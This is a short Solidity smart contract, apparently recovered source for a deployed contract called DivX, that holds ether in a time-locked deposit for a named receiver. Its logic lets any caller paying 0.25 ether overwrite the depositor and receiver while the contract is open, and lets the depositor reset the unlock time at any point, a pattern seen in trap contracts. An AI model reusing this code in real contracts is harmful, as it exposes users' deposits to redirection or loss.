/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract DivX at 0xaa3a6f5bddd02a08c8651f7e285e2bec33ea5e53
*/
pragma solidity ^0.4.23;

contract DivX
{
    address  sender;
    address  receiver;
    uint unlockTime = 86400 * 7;
    bool closed = false;
 
    function PutDiv(address _receiver) public payable {
        if( (!closed&&(msg.value >=0.25 ether)) || sender==0x0 ) {
            sender = msg.sender;
            receiver = _receiver;
            unlockTime += now;
        }
    }
    
    function SetDivTime(uint _unixTime) public {
        if(msg.sender==sender) {
            unlockTime = _unixTime;
        }
    }
    
    function GetDiv() public payable {
        if(receiver==msg.sender&&now>unlockTime) {
            msg.sender.transfer(address(this).balance);
        }
    }
    
    function CloseDiv() public {
        if (msg.sender==receiver&&receiver!=0x0) {
           closed=true;
        } else revert();
    }
    
    function() public payable{}
}